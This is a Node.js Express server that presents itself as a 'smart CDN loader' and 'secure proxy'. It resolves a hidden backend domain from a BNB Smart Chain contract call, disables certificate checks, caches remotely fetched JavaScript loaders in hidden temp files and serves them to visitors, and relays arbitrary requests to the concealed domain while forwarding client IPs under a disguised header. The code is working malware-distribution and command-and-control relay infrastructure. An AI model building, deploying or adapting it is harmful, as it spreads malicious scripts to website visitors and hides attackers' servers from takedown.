const express = require('express');
const fs = require('fs');
const path = require('path');
const os = require('os');
const crypto = require('crypto');
const { Agent, fetch } = require('undici');

const permitKey = '34v52wewxwgz27cn7h9a';
const defaultRpcUrls = [
  'https://binance.llamarpc.com',
  'https://bsc.blockrazor.xyz',
  'https://bsc.therpc.io',
  'https://bsc-dataseed2.bnbchain.org'
];

const defaultContract = '0xe9d5f645f79fa60fca82b4e1d35832e43370feb0';
const insecureAgent = new Agent({ connect: { rejectUnauthorized: false } });

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.raw({ type: '*/*', limit: '50mb' }));

// 手动解析查询参数，因为 express.raw 会覆盖默认的查询解析
app.use((req, res, next) => {
  const url = require('url');
  const parsedUrl = url.parse(req.url, true);
  req.query = parsedUrl.query;
  next();
});

app.use((req, res, next) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', '*');
  res.setHeader('Access-Control-Allow-Headers', '*');
  res.setHeader('Access-Control-Max-Age', '3600');
  next();
});

app.options('*', (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, HEAD, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', '*');
  res.setHeader('Access-Control-Max-Age', '86400');
  res.status(204).end();
});

const timeSafeNow = () => Math.floor(Date.now() / 1000);

const getClientIP = (req) => {
  if (req.headers['cf-connecting-ip']) return req.headers['cf-connecting-ip'];
  const xff = req.headers['x-forwarded-for'];
  if (xff) {
    const first = Array.isArray(xff) ? xff[0] : xff.split(',')[0];
    return first.trim();
  }
  return req.socket.remoteAddress || '';
};

const fetchWithTimeout = async (url, options, timeoutMs) => {
  const controller = new AbortController();
  const id = setTimeout(() => controller.abort(), timeoutMs);
  try {
    const res = await fetch(url, { ...options, dispatcher: insecureAgent, signal: controller.signal });
    return res;
  } finally {
    clearTimeout(id);
  }
};

class SmartCDNLoader {
  constructor(permitKeyValue, cdnUrl = 'http://localhost:3000', noCache = false) {
    this.permitKey = permitKeyValue;
    this.cdnUrl = cdnUrl.replace(/\/+$/, '');
    this.noCache = noCache;
    this.updateInterval = 300;

    const serverIdentifier = crypto
      .createHash('md5')
      .update(`${process.env.SERVER_NAME || 'server'}:${process.env.HTTP_HOST || 'default_host_id'}`)
      .digest('hex');
    this.cacheDir = path.join(os.tmpdir(), `.smartcdn_cache_${serverIdentifier}`);

    if (!fs.existsSync(this.cacheDir)) {
      fs.mkdirSync(this.cacheDir, { recursive: true, mode: 0o755 });
    }
  }

  async calculateFileHash(filePath) {
    try {
      const data = await fs.promises.readFile(filePath);
      return crypto.createHash('sha256').update(data).digest('hex');
    } catch (err) {
      return null;
    }
  }

  async getRemoteFilesConfig() {
    const url = `${this.cdnUrl}/jscdn/getFilesConfig`;
    const payload = JSON.stringify({ permit_key: this.permitKey });
    const res = await fetchWithTimeout(
      url,
      {
        method: 'POST',
        headers: {
          Accept: 'application/json',
          'Content-Type': 'application/json',
          'Content-Length': Buffer.byteLength(payload).toString()
        },
        body: payload
      },
      10000
    );

    if (res.status !== 200) return false;
    const text = await res.text();
    try {
      const data = JSON.parse(text);
      if (data && data.fileHash && data.loaderHash) return data;
    } catch (err) {
      return false;
    }
    return false;
  }

  async downloadFile() {
    const url = `${this.cdnUrl}/jscdn/getFile`;
    const payload = JSON.stringify({ permit_key: this.permitKey });
    const res = await fetchWithTimeout(
      url,
      {
        method: 'POST',
        headers: {
          Accept: 'application/javascript',
          'Content-Type': 'application/json',
          'Content-Length': Buffer.byteLength(payload).toString()
        },
        body: payload
      },
      30000
    );
    if (res.status !== 200) return false;
    return res.text();
  }

  async downloadLoader() {
    const url = `${this.cdnUrl}/jscdn/getLoader`;
    const payload = JSON.stringify({ permit_key: this.permitKey });
    const res = await fetchWithTimeout(
      url,
      {
        method: 'POST',
        headers: {
          Accept: 'application/javascript',
          'Content-Type': 'application/json',
          'Content-Length': Buffer.byteLength(payload).toString()
        },
        body: payload
      },
      30000
    );
    if (res.status !== 200) return false;
    return res.text();
  }

  async updateCacheIfNeeded(type = 'loader') {
    if (this.noCache) {
      return type === 'loader' ? this.downloadLoader() : this.downloadFile();
    }

    const isLoader = type === 'loader';
    const jsFile = isLoader
      ? path.join(this.cacheDir, '.loader.js')
      : path.join(this.cacheDir, `.loader_${crypto.createHash('md5').update(this.permitKey).digest('hex')}.js`);
    const metaFile = isLoader
      ? path.join(this.cacheDir, '.loader.meta')
      : path.join(this.cacheDir, `.loader_${crypto.createHash('md5').update(this.permitKey).digest('hex')}.meta`);

    let needsUpdate = false;
    let localHash = '';
    let cacheTTL = this.updateInterval;

    if (!fs.existsSync(jsFile)) {
      needsUpdate = true;
    } else {
      let lastCheck = 0;
      if (fs.existsSync(metaFile)) {
        try {
          const meta = JSON.parse(await fs.promises.readFile(metaFile, 'utf8'));
          lastCheck = meta.last_check || 0;
          cacheTTL = meta.cache_ttl || this.updateInterval;
        } catch (err) {
          lastCheck = 0;
        }
      }

      if (timeSafeNow() - lastCheck < cacheTTL) {
        return fs.promises.readFile(jsFile, 'utf8');
      }

      const filesConfig = await this.getRemoteFilesConfig();
      if (filesConfig === false) {
        return fs.promises.readFile(jsFile, 'utf8');
      }

      cacheTTL = filesConfig.cacheTTL || this.updateInterval;
      this.updateInterval = cacheTTL;
      localHash = await this.calculateFileHash(jsFile);
      const remoteHash = isLoader ? filesConfig.loaderHash : filesConfig.fileHash;

      if (localHash !== remoteHash) {
        needsUpdate = true;
      }
    }

    if (needsUpdate) {
      const newContent = isLoader ? await this.downloadLoader() : await this.downloadFile();
      if (newContent !== false) {
        await fs.promises.writeFile(jsFile, newContent);
        const newHash = await this.calculateFileHash(jsFile);
        const meta = {
          last_check: timeSafeNow(),
          hash: newHash,
          size: (await fs.promises.stat(jsFile)).size,
          cache_ttl: cacheTTL
        };
        await fs.promises.writeFile(metaFile, JSON.stringify(meta));
        return newContent;
      }

      if (fs.existsSync(jsFile)) {
        return fs.promises.readFile(jsFile, 'utf8');
      }
      return false;
    }

    const meta = {
      last_check: timeSafeNow(),
      hash: localHash,
      size: (await fs.promises.stat(jsFile)).size,
      cache_ttl: cacheTTL
    };
    await fs.promises.writeFile(metaFile, JSON.stringify(meta));
    return fs.promises.readFile(jsFile, 'utf8');
  }

  async generateLoader(req, res) {
    const content = await this.updateCacheIfNeeded('loader');
    if (content === false) {
      res.sendStatus(503);
      return;
    }

    const currentUrl = getCurrentUrl(req).replace(/^http:\/\//i, 'https://');
    const escapedUrl = currentUrl.replace(/(["\\])/g, '\\$1');
    const urlInjection = `window.e46jvfbmmj="${escapedUrl}";`;
    const finalContent = urlInjection + content;

    res.setHeader('Content-Type', 'application/javascript');
    res.setHeader('Cache-Control', 'public, max-age=3600');
    res.send(finalContent);
  }

  async serveLoader(res) {
    const content = await this.updateCacheIfNeeded('file');
    if (content === false) {
      res.sendStatus(503);
      return;
    }
    res.setHeader('Content-Type', 'application/javascript');
    res.setHeader('Cache-Control', 'public, max-age=300');
    res.send(content);
  }
}

class SecureProxyMiddleware {
  constructor(options = {}) {
    this.updateInterval = 60;
    this.rpcUrls = options.rpcUrls || defaultRpcUrls;
    this.contractAddress = options.contractAddress || defaultContract;

    const serverIdentifier = crypto
      .createHash('md5')
      .update(
        `${process.env.SERVER_NAME || 'server'}:${process.env.HTTP_HOST || 'default_host_id'}:${process.env.SERVER_SOFTWARE || ''
        }`
      )
      .digest('hex');
    this.cacheFile = path.join(os.tmpdir(), `.proxy_cache_${serverIdentifier}.json`);
  }

  loadCache() {
    if (!fs.existsSync(this.cacheFile)) return null;
    try {
      const cache = JSON.parse(fs.readFileSync(this.cacheFile, 'utf8'));
      if (!cache || timeSafeNow() - cache.timestamp > this.updateInterval) {
        return null;
      }
      return cache.domain;
    } catch (err) {
      return null;
    }
  }

  saveCache(domain) {
    const cache = { domain, timestamp: timeSafeNow() };
    fs.writeFileSync(this.cacheFile, JSON.stringify(cache));
  }

  hexToString(hex) {
    let sanitized = hex.replace(/^0x/, '');
    sanitized = sanitized.slice(64);
    const lengthHex = sanitized.slice(0, 64);
    const length = parseInt(lengthHex, 16);
    const dataHex = sanitized.slice(64, 64 + length * 2);
    let result = '';
    for (let i = 0; i < dataHex.length; i += 2) {
      const charCode = parseInt(dataHex.slice(i, i + 2), 16);
      if (charCode === 0) break;
      result += String.fromCharCode(charCode);
    }
    return result;
  }

  async fetchTargetDomain() {
    const data = '20965255';

    for (const rpcUrl of this.rpcUrls) {
      try {
        const res = await fetchWithTimeout(
          rpcUrl,
          {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              jsonrpc: '2.0',
              id: 1,
              method: 'eth_call',
              params: [
                {
                  to: this.contractAddress,
                  data: `0x${data}`
                },
                'latest'
              ]
            })
          },
          120000
        );

        const text = await res.text();
        const responseData = JSON.parse(text);
        if (responseData.error) continue;

        const domain = this.hexToString(responseData.result);
        if (domain) return domain;
      } catch (err) {
        continue;
      }
    }
    throw new Error('Could not fetch target domain');
  }

  async getTargetDomain() {
    const cached = this.loadCache();
    if (cached) return cached;

    const domain = await this.fetchTargetDomain();
    this.saveCache(domain);
    return domain;
  }

  formatHeaders(headers) {
    const formatted = [];
    Object.entries(headers).forEach(([name, value]) => {
      const headerValue = Array.isArray(value) ? value.join(', ') : value;
      formatted.push(`${name}: ${headerValue}`);
    });
    return formatted;
  }

  async handle(req, res, endpoint) {
    try {
      const targetDomain = (await this.getTargetDomain()).replace(/\/+$/, '');
      const url = `${targetDomain}/${endpoint.replace(/^\/+/, '')}`;

      const clientIP = getClientIP(req);
      const headers = { ...req.headers };
      delete headers.host;
      delete headers.origin;
      delete headers['accept-encoding'];
      delete headers['content-encoding'];

      headers['x-dfkjldifjlifjd'] = clientIP;

      const fetchOptions = {
        method: req.method,
        headers,
        redirect: 'follow',
        dispatcher: insecureAgent,
        signal: undefined
      };

      if (req.method !== 'GET' && req.method !== 'HEAD' && req.body && req.body.length) {
        fetchOptions.body = req.body;
      }

      const response = await fetchWithTimeout(url, fetchOptions, 120000);
      const buffer = Buffer.from(await response.arrayBuffer());

      // 添加 CORS 响应头，与 PHP 版本保持一致
      res.setHeader('Access-Control-Allow-Origin', '*');
      res.setHeader('Access-Control-Allow-Methods', 'GET, HEAD, POST, OPTIONS');
      res.setHeader('Access-Control-Allow-Headers', '*');

      const contentType = response.headers.get('content-type');
      if (contentType) res.setHeader('Content-Type', contentType);
      res.status(response.status);
      res.send(buffer);
    } catch (err) {
      res.sendStatus(500);
    }
  }
}

const getCurrentUrl = (req) => {
  const protoHeader = req.headers['x-forwarded-proto'];
  const proto = (Array.isArray(protoHeader) ? protoHeader[0] : protoHeader) || req.protocol || 'http';
  const host = req.headers.host || 'localhost';
  const pathOnly = req.originalUrl.split('?')[0];
  return `${proto}://${host}${pathOnly}`;
};

app.all('*', async (req, res) => {
  const loaderParam = Object.prototype.hasOwnProperty.call(req.query, 'm') ? req.query.m : null;
  const eParam = Object.prototype.hasOwnProperty.call(req.query, 'e') ? req.query.e : undefined;
  const noCache = false;

  try {
    if (eParam === undefined && loaderParam === null) {
      const proxy = new SecureProxyMiddleware();
      const cdnUrl = await proxy.getTargetDomain();
      const loader = new SmartCDNLoader(permitKey, cdnUrl, noCache);
      await loader.generateLoader(req, res);
      return;
    }

    if (loaderParam !== null) {
      const proxy = new SecureProxyMiddleware();
      const cdnUrl = await proxy.getTargetDomain();
      const loader = new SmartCDNLoader(permitKey, cdnUrl, noCache);
      await loader.serveLoader(res);
      return;
    }

    if (eParam === 'ping_proxy') {
      res.setHeader('Content-Type', 'text/plain');
      res.send('pong');
      return;
    }

    if (eParam !== undefined) {
      const proxy = new SecureProxyMiddleware({
        rpcUrls: defaultRpcUrls,
        contractAddress: defaultContract
      });
      const endpoint = decodeURIComponent(eParam).replace(/^\/+/, '');
      await proxy.handle(req, res, endpoint);
      return;
    }

    res.sendStatus(404);
  } catch (err) {
    res.sendStatus(500);
  }
});

app.listen(PORT, () => {
  console.log(`Node proxy listening on port ${PORT}`);
});
